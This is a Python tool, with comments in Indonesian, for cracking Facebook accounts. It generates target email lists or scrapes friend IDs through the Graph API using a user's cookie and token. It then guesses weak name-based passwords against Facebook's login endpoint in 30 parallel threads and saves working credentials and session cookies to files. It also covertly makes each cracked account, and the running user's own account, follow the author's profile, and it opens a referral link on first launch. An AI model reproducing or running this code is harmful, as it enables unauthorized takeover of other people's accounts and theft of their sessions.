#!/usr/bin/env python
# coding:utf-8
# @Khamdihi Dev 2023
# Menerima Jasa Pembuatan Script (Wa:085729416714)

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
success, checkpoint, duplikat, loop = 0, 0, [], 0

import random, sys, re, requests, time, os
from concurrent.futures import ThreadPoolExecutor as executor

def random_email(xnxx = []):
    print('\n%s[%s?%s] %sMasukan Nama!, Gunakan Tanda Koma Sebagai Pemisah'%(N,M,N,N))
    print('[%s!%s] Satu Nama Setara Dengan 600-1000 Email'%(M,N))
    uname = str(input('%s[%s!%s] %sNama Orang : %s'%(N,M,N,N,H))).split(',')
    blkang = str(input('%s[%s!%s] %sNama Belakang : %s'%(N,M,N,N,H))).split(',')
    limit = int(input('\n%s[%s!%s] %sLimit User : %s'%(N,M,N,N,H)))
    domain = str(input('%s[%s!%s] %sDomain Email (ex:@gmail.com): %s'%(N,M,N,N,H)))
    orang = ['amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun',random.randint(1,20),'32','28','123','24','oficial','cans','ganz','tok','xd','id','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri',random.randint(0,35),'rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','khamdihi','iren','ine','reni','ufik','rohmah','khasna','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rudi','bambang','supri','wawan','karnawan','akatsuki','wibu','cakep','cantik','ganteng','hitam',random.randint(0,60),'zulki','angga','yayan','dapunta','romi','khamdihi','rohmat','basuki','hamzah','boy','cahyani','sadiyah','salamah','anit']
    with executor(max_workers=2) as MLB:
        for w in range(100):
            for idc in uname:
                for nmc in orang:
                    for blk in blkang:
                        nam1 = '%s%s%s|%s %s'%(idc,nmc,domain,idc,blk)
                        nam2 = '%s%s%s|%s'%(idc,random.randint(1,999), domain,idc)
                        nam3 = '%s%s%s|%s %s'%(idc,blk,domain,idc, blk)
                        nam4 = '%s%s%s|%s %s'%(blk,nmc,domain,blk,nmc)
                        nam5 = '%s%s%s|%s %s'%(nmc,idc,domain,nmc,idc)
                        if nam1 not in xnxx:xnxx.append(nam1)
                        if nam2 not in xnxx:xnxx.append(nam2)
                        if nam3 not in xnxx:xnxx.append(nam3)
                        if nam4 not in xnxx:xnxx.append(nam4)
                        print('%s[%s!%s] Success Medapatkan %s Email'%(N,M,N,len(xnxx)),end='\r')
                        sys.stdout.flush()
                        if int(len(xnxx)) == limit:Run(xnxx)
    Run(xnxx)

def dump_publik(ck,tk, dump = []):
    dta = {'access_token':tk,'after':None}
    url = 'https://graph.facebook.com/v18.0/%s/friends'
    uid = input('\n%s[%s!%s] Gunakan Tanda Koma Buat Pemisahan Id\n[%s?%s] Masukan Id : %s'%(N,M,N,M,N,H))
    for xxx in uid.split(','):
        exec_dump(dta, url, xxx, dump, ck)
    print('')
    Run(dump)

def exec_dump(params, host, user, array, coki):
    try:
        req = requests.get(host%(user), params=params, cookies={'cookie':coki}).json()
        for xyz in req['data']:
            uid = '%s|%s'%(xyz['id'],xyz['name'])
            if uid not in array:array.append(uid)
            print('%s[%s!%s] Success Medapatkan %s Id '%(N,M,N,len(array)),end='\r')
            sys.stdout.flush()
        if 'paging' in str(req):
           after = req['paging']['cursors']['after']
           params.update({'after': after})
           exec_dump(params, host, user, array, coki)
    except:pass
    return array

def Run(xnxx):
    from datetime import datetime as date
    new = date.now()
    hari, bulan, tahun = new.day, new.month, new.year
    asu = '%s/%s/%s'%(hari,bulan,tahun)
    print('\n%s[%s*%s] Hari, Bulan, Tahun : %s%s\n%s[%s!%s] Proses Sedang Di Mulai\n'%(N,M,N,H,asu,N,M,N))
    with executor(max_workers=30) as DFF:
        for data in xnxx:
            email, nama = data.split('|')
            password = generate(nama)
            DFF.submit(login_, email, password,xnxx)
    exit(1)

def generate(nama):
    pwd = []
    pwd.append('123456')
    pwd.append('sayang')
    pwd.append('kata sandi')
    for user in nama.split(' '):
        if len(user) <2:continue
        elif len(user) == 3 or len(user) == 4 or len(user) == 5:pwd.append(user+'123');pwd.append(user+'1234');pwd.append(user+'12345');pwd.append(user+'123456');pwd.append('123456');pwd.append(user.capitalize()+'123')
        else:pwd.append(user+'123');pwd.append(user+'1234');pwd.append(user+'12345');pwd.append(user+'123456');pwd.append('123456');pwd.append(user);pwd.append(nama);pwd.append(user.capitalize()+'123')
    return pwd

def login_(email, pswd, total):
    global success, checkpoint, loop, duplikat
    xyz = requests.Session()
    clr = random.choice([P,M,K,H,B,U,O])
    uaz = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    print('%s[%s!%s] %s/%s OK:%s CP:%s'%(N,clr,N,loop, len(total), success, checkpoint),end='\r')
    sys.stdout.flush()
    for pas in pswd:
        try:
            xnxx = xyz.get('https://x.prod.facebook.com/login/?ref=dbl&fl&login_from_aymh=1').text
            headers = {
               'Host': 'x.prod.facebook.com',
               'sec-ch-ua': 'Google',
               'sec-ch-ua-mobile': '?0',
               'user-agent': uaz,
               'viewport-width': '980',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xnxx)).group(1),
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Google',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://x.prod.facebook.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://x.prod.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            data = {
               'm_ts':re.search('name="m_ts" value="(.*?)"', str(xnxx)).group(1),
               'li':re.search('name="li" value="(.*?)"', str(xnxx)).group(1),
               'try_number':'0',
               'unrecognized_tries':'0',
               'email':f'{email}',
               'prefill_contact_point':f'{email}',
               'prefill_source':'browser_dropdown',
               'prefill_type':'password',
               'first_prefill_source':'browser_dropdown',
               'first_prefill_type':'contact_point',
               'had_cp_prefilled':'true',
               'had_password_prefilled':'true',
               'is_smart_lock':'false',
               'bi_xrwh':'0',
               'encpass':'#PWD_BROWSER:0:%s:%s'%(re.search('name="m_ts" value="(.*?)"', str(xnxx)).group(1),pas),
               'jazoest':re.search('name="jazoest" value="(.*?)"', str(xnxx)).group(1),
               'lsd':re.search('name="lsd" value="(.*?)"', str(xnxx)).group(1),
               '__dyn':'',
               '__csr':'',
               '__req':'1',
               '__a':re.search('"encrypted":"(.*?)"', str(xnxx)).group(1),
               '__user':'0'
            }
            kuki = 'datr=ufhMZWEcSCUIHQitVBSZt5eD;'
            kuki+= ';'.join([key+'='+value for key, value in xyz.cookies.get_dict().items()])
            resp = xyz.post('https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', cookies = {'cookie': kuki}, data = data, headers = headers)
            if "checkpoint" in xyz.cookies.get_dict():
                try:uid = xyz.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                except:uid = email
                if uid in duplikat:
                   break
                duplikat.append(uid)
                print('\r%s* --> %s|%s'%(K,uid,pas))
                checkpoint +=1
                open('CP.json','a').write('%s|%s\n'%(uid,pas))
                break
            elif "c_user" in xyz.cookies.get_dict():
                koki = ';'.join([key+'='+value for key, value in xyz.cookies.get_dict().items()])
                user = re.search('c_user=(\d+)',str(koki)).group(1)
                if user in duplikat or email in duplikat:
                   break
                duplikat.append(user)
                print('\r%s* --> %s|%s|%s'%(H,user,pas,koki))
                success +=1
                asuu = {'cookie': koki}
                follow_me(asuu)
                open('OK.json','a').write('%s|%s|%s\n'%(user,pas,koki))
                break
        except requests.exceptions.ConnectionError:time.sleep(10)
    loop +=1

def menu():
    try:os.system('mkdir Data')
    except:pass
    if os.path.isfile('Data/cokie.txt') is True:
       coki, ctok = open('Data/cokie.txt','r').read(), open('Data/token.txt','r').read()
    else:login()
    try:
        name = requests.get('https://graph.facebook.com/%s?access_token=%s'%('me',ctok), cookies = {'cookie':coki}).json()['name']
    except KeyError:login()
    except requests.exceptions.ConnectionError:menu()
    os.system('clear')
    print('%s[ %sHai %s%s %sWelcome %s]\n'%(M,N,H,name,N,M))
    print('%s[%s1%s] Crack Email'%(N,M,N))
    print('%s[%s2%s] Crack Publik'%(N,M,N))
    print('%s[%s3%s] Check Results'%(N,M,N))
    print('%s[%s4%s] Exit\n'%(N,M,N))
    x = input('%s[%s?%s] Choose : %s'%(N,M,N,H))
    if x in ('1'):random_email()
    elif x in ('2'):dump_publik(coki,ctok)
    elif x in ('3'):
        q = 0
        print('\n%s[%s1%s] Akun OK'%(N,M,N))
        print('%s[%s2%s] Akun CP'%(N,M,N))
        h = input('%s[%s?%s] Choose : %s'%(N,M,N,H))
        if h in ('1','01'):dir='OK.json'
        elif h in ('2','02'):dir='CP.json'
        else:menu()
        print(f'\n[ {H}Semua Result Akun {dir} {N}]\n')
        for w in open(f'{dir}','r').read().splitlines():
            q +=1
            if dir == 'OK.txt':
               print('\r %s%s. %s%s\n'%(H,q,N,w))
            else:
               print('\r %s%s. %s%s'%(M,q,N,w))
        exit()
    elif x in ('4'):exit()
    else:menu()

def login():
    cokie = {'cookie':input("cookie: ")}
    try:
        req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
        act = re.search('act=(\d+)',str(req)).group(1)
        res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text
        xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
        open('Data/cokie.txt','w').write(cokie.get('cookie'))
        open('Data/token.txt','w').write(xyz)
        follow_me(cokie)
        exit(os.system('python %s'%(sys.argv[0])))
    except Exception as e:
        exit(e)

def follow_me(xyz): # YANG GAK GANTI BOT FOLLOW GANTENG
    from bs4 import BeautifulSoup as BSP
    try:
        req = BSP(requests.get('https://m.facebook.com/100090703092541', cookies = xyz).text,'html.parser')
        for i in req.find_all('a', href=True):
            if '/a/subscribe.php?' in str(i.get('href')):
                r = requests.get('https://m.facebook.com%s'%(i['href']), cookies=xyz).text
    except:pass

def Ngelink(dir = '.link'):
    if os.path.isfile(dir) is True:menu()
    else:
        try:
           os.system('xdg-open https://yukchat.fun/mQWgM')
           open(dir,'w').write('True')
           time.sleep(2)
           menu()
        except:pass

if __name__ == '__main__':
   Ngelink()
